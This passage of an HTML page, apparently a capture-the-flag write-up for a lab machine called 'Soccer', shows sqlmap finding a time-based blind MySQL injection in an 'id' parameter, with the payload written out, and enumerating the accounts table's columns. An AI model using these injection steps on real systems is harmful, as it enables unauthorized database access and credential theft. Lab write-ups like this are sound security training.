+<figure><img src="/img/Soccer_1b9739f8fee5449c921268c1b05aead0/Untitled_2.png" alt="" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>We can dump the database using <code>sqlmap</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="err">❯</span> <span class="nx">sqlmap</span> <span class="o">-</span><span class="nx">u</span> <span class="s2">&#34;http://localhost:8081/?id=1&#34;</span> <span class="o">-</span><span class="nx">p</span> <span class="s2">&#34;id&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">___</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">__H__</span>
+</span></span><span class="line"><span class="cl"> <span class="nx">___</span> <span class="nx">___</span><span class="p">[(]</span><span class="nx">_____</span> <span class="nx">___</span> <span class="nx">___</span>  <span class="p">{</span><span class="mf">1.6.5</span><span class="err">#</span><span class="nx">stable</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="nx">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="p">[(]</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">&#39;| . |
+</span></span></span><span class="line"><span class="cl"><span class="s1">|___|_  [(]_|_|_|__,|  _|
+</span></span></span><span class="line"><span class="cl"><span class="s1">      |_|V...       |_|   https://sqlmap.org
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span><span class="nx">s</span> <span class="nx">responsibility</span> <span class="nx">to</span> <span class="nx">obey</span> <span class="nx">all</span> <span class="nx">applicable</span> <span class="nx">local</span><span class="p">,</span> <span class="nx">state</span> <span class="nx">and</span> <span class="nx">federal</span> <span class="nx">laws</span><span class="p">.</span> <span class="nx">Developers</span> <span class="nx">assume</span> <span class="nx">no</span> <span class="nx">liability</span> <span class="nx">and</span> <span class="nx">are</span> <span class="nx">not</span> <span class="nx">responsible</span> <span class="k">for</span> <span class="nx">any</span> <span class="nx">misuse</span> <span class="nx">or</span> <span class="nx">damage</span> <span class="nx">caused</span> <span class="nx">by</span> <span class="k">this</span> <span class="nx">program</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">starting</span> <span class="err">@</span> <span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">55</span> <span class="o">/</span><span class="mi">2023</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">18</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="nx">connection</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">target</span> <span class="nx">URL</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">turning</span> <span class="nx">off</span> <span class="nx">pre</span><span class="o">-</span><span class="nx">connect</span> <span class="nx">mechanism</span> <span class="nx">because</span> <span class="k">of</span> <span class="nx">incompatible</span> <span class="nx">server</span> <span class="p">(</span><span class="s1">&#39;SimpleHTTP/0.6 Python/3.9.10&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="k">if</span> <span class="nx">the</span> <span class="nx">target</span> <span class="nx">URL</span> <span class="nx">content</span> <span class="nx">is</span> <span class="nx">stable</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">target</span> <span class="nx">URL</span> <span class="nx">content</span> <span class="nx">is</span> <span class="nx">stable</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">heuristic</span> <span class="p">(</span><span class="nx">basic</span><span class="p">)</span> <span class="nx">test</span> <span class="nx">shows</span> <span class="nx">that</span> <span class="nx">GET</span> <span class="nx">parameter</span> <span class="s1">&#39;id&#39;</span> <span class="nx">might</span> <span class="nx">not</span> <span class="nx">be</span> <span class="nx">injectable</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="k">for</span> <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">on</span> <span class="nx">GET</span> <span class="nx">parameter</span> <span class="s1">&#39;id&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Boolean-based blind - Parameter replace (original value)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Generic inline queries&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;PostgreSQL &gt; 8.1 stacked queries (comment)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">comparison</span> <span class="nx">requires</span> <span class="nx">larger</span> <span class="nx">statistical</span> <span class="nx">model</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">wait</span><span class="p">.</span> <span class="p">(</span><span class="nx">done</span><span class="p">)</span>                     
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">08</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Microsoft SQL Server/Sybase stacked queries (comment)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">GET</span> <span class="nx">parameter</span> <span class="s1">&#39;id&#39;</span> <span class="nx">appears</span> <span class="nx">to</span> <span class="nx">be</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span> <span class="nx">injectable</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">it</span> <span class="nx">looks</span> <span class="nx">like</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="s1">&#39;MySQL&#39;</span><span class="p">.</span> <span class="nx">Do</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">skip</span> <span class="nx">test</span> <span class="nx">payloads</span> <span class="nx">specific</span> <span class="k">for</span> <span class="nx">other</span> <span class="nx">DBMSes</span><span class="o">?</span> <span class="p">[</span><span class="nx">Y</span><span class="o">/</span><span class="nx">n</span><span class="p">]</span> <span class="nx">Y</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">the</span> <span class="nx">remaining</span> <span class="nx">tests</span><span class="p">,</span> <span class="k">do</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">to</span> <span class="nx">include</span> <span class="nx">all</span> <span class="nx">tests</span> <span class="k">for</span> <span class="s1">&#39;MySQL&#39;</span> <span class="nx">extending</span> <span class="nx">provided</span> <span class="nx">level</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="nx">and</span> <span class="nx">risk</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="nx">values</span><span class="o">?</span> <span class="p">[</span><span class="nx">Y</span><span class="o">/</span><span class="nx">n</span><span class="p">]</span> <span class="nx">Y</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">29</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">29</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">automatically</span> <span class="nx">extending</span> <span class="nx">ranges</span> <span class="k">for</span> <span class="nx">UNION</span> <span class="nx">query</span> <span class="nx">injection</span> <span class="nx">technique</span> <span class="nx">tests</span> <span class="nx">as</span> <span class="nx">there</span> <span class="nx">is</span> <span class="nx">at</span> <span class="nx">least</span> <span class="nx">one</span> <span class="nx">other</span> <span class="p">(</span><span class="nx">potential</span><span class="p">)</span> <span class="nx">technique</span> <span class="nx">found</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">37</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">target</span> <span class="nx">URL</span> <span class="nx">appears</span> <span class="nx">to</span> <span class="nx">be</span> <span class="nx">UNION</span> <span class="nx">injectable</span> <span class="kd">with</span> <span class="mi">3</span> <span class="nx">columns</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="k">if</span> <span class="nx">UNION</span> <span class="nx">based</span> <span class="nx">SQL</span> <span class="nx">injection</span> <span class="nx">is</span> <span class="nx">not</span> <span class="nx">detected</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">consider</span> <span class="nx">forcing</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">g</span><span class="p">.</span> <span class="s1">&#39;--dbms=mysql&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">checking</span> <span class="k">if</span> <span class="nx">the</span> <span class="nx">injection</span> <span class="nx">point</span> <span class="nx">on</span> <span class="nx">GET</span> <span class="nx">parameter</span> <span class="s1">&#39;id&#39;</span> <span class="nx">is</span> <span class="nx">a</span> <span class="kc">false</span> <span class="nx">positive</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">sqlmap</span> <span class="nx">identified</span> <span class="nx">the</span> <span class="nx">following</span> <span class="nx">injection</span> <span class="nx">point</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="kd">with</span> <span class="nx">a</span> <span class="nx">total</span> <span class="k">of</span> <span class="mi">98</span> <span class="nx">HTTP</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">requests</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Parameter</span><span class="o">:</span> <span class="nx">id</span> <span class="p">(</span><span class="nx">GET</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Type</span><span class="o">:</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">blind</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Title</span><span class="o">:</span> <span class="nx">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0.12</span> <span class="nx">AND</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">blind</span> <span class="p">(</span><span class="nx">query</span> <span class="nx">SLEEP</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Payload</span><span class="o">:</span> <span class="nx">id</span><span class="o">=</span><span class="mi">1</span> <span class="nx">AND</span> <span class="p">(</span><span class="nx">SELECT</span> <span class="mi">6120</span> <span class="nx">FROM</span> <span class="p">(</span><span class="nx">SELECT</span><span class="p">(</span><span class="nx">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="nx">ECkW</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">very</span> <span class="nx">important</span> <span class="nx">to</span> <span class="nx">not</span> <span class="nx">stress</span> <span class="nx">the</span> <span class="nx">network</span> <span class="nx">connection</span> <span class="nx">during</span> <span class="nx">usage</span> <span class="k">of</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">payloads</span> <span class="nx">to</span> <span class="nx">prevent</span> <span class="nx">potential</span> <span class="nx">disruptions</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="o">:</span> <span class="nx">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0.12</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetched</span> <span class="nx">data</span> <span class="nx">logged</span> <span class="nx">to</span> <span class="nx">text</span> <span class="nx">files</span> <span class="nx">under</span> <span class="s1">&#39;/home/kali/.local/share/sqlmap/output/localhost&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">37</span><span class="o">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">your</span> <span class="nx">sqlmap</span> <span class="nx">version</span> <span class="nx">is</span> <span class="nx">outdated</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="nx">snip</span><span class="p">..]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="nx">you</span> <span class="nx">want</span> <span class="nx">sqlmap</span> <span class="nx">to</span> <span class="k">try</span> <span class="nx">to</span> <span class="nx">optimize</span> <span class="nx">value</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="k">for</span> <span class="nx">DBMS</span> <span class="nx">delay</span> <span class="nx">responses</span> <span class="p">(</span><span class="nx">option</span> <span class="s1">&#39;--time-sec&#39;</span><span class="p">)</span><span class="o">?</span> <span class="p">[</span><span class="nx">Y</span><span class="o">/</span><span class="nx">n</span><span class="p">]</span> <span class="nx">Y</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">confirming</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">it</span> <span class="nx">is</span> <span class="nx">very</span> <span class="nx">important</span> <span class="nx">to</span> <span class="nx">not</span> <span class="nx">stress</span> <span class="nx">the</span> <span class="nx">network</span> <span class="nx">connection</span> <span class="nx">during</span> <span class="nx">usage</span> <span class="k">of</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">payloads</span> <span class="nx">to</span> <span class="nx">prevent</span> <span class="nx">potential</span> <span class="nx">disruptions</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">36</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">adjusting</span> <span class="nx">time</span> <span class="nx">delay</span> <span class="nx">to</span> <span class="mi">1</span> <span class="nx">second</span> <span class="nx">due</span> <span class="nx">to</span> <span class="nx">good</span> <span class="nx">response</span> <span class="nx">times</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">36</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="o">:</span> <span class="nx">MySQL</span> <span class="o">&gt;=</span> <span class="mf">8.0.0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">36</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="nx">missing</span> <span class="nx">database</span> <span class="nx">parameter</span><span class="p">.</span> <span class="nx">sqlmap</span> <span class="nx">is</span> <span class="nx">going</span> <span class="nx">to</span> <span class="nx">use</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">enumerate</span> <span class="nx">table</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="nx">entries</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">36</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">current</span> <span class="nx">database</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">38</span><span class="o">:</span><span class="mi">36</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">soccer_db</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">tables</span> <span class="k">for</span> <span class="nx">database</span><span class="o">:</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">tables</span> <span class="k">for</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">30</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">accounts</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">18</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">columns</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">18</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">email</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">40</span><span class="o">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">id</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">password</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">48</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="nx">username</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">fetching</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">entries</span> <span class="k">for</span> <span class="nx">table</span> <span class="s1">&#39;accounts&#39;</span> <span class="k">in</span> <span class="nx">database</span> <span class="s1">&#39;soccer_db&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">31</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">retrieved</span><span class="o">:</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">42</span><span class="o">:</span><span class="mi">35</span><span class="p">]</span> <span class="p">[</span><span class="nx">WARNING</span><span class="p">]</span> <span class="p">(</span><span class="k">case</span><span class="p">)</span> <span class="nx">time</span><span class="o">-</span><span class="nx">based</span> <span class="nx">comparison</span> <span class="nx">requires</span> <span class="nx">reset</span> <span class="k">of</span> <span class="nx">statistical</span> <span class="nx">model</span><span class="p">,</span> <span class="nx">please</span> <span class="nx">wait</span><span class="p">..............................</span> <span class="p">(</span><span class="nx">done</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[..</span><span class="nx">snip</span><span class="p">..]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">testing</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">confirming</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">17</span><span class="o">:</span><span class="mi">43</span><span class="o">:</span><span class="mi">22</span><span class="p">]</span> <span class="p">[</span><span class="nx">INFO</span><span class="p">]</span> <span class="nx">the</span> <span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span> <span class="nx">is</span> <span class="nx">MySQL</span>
+</span></span><span class="line"><span class="cl"><span class="nx">back</span><span class="o">-</span><span class="nx">end</span> <span class="nx">DBMS</span><span class="o">:</span> <span class="nx">MySQL</span> <span class="o">&gt;=</span> <span class="mf">8.0.0</span>
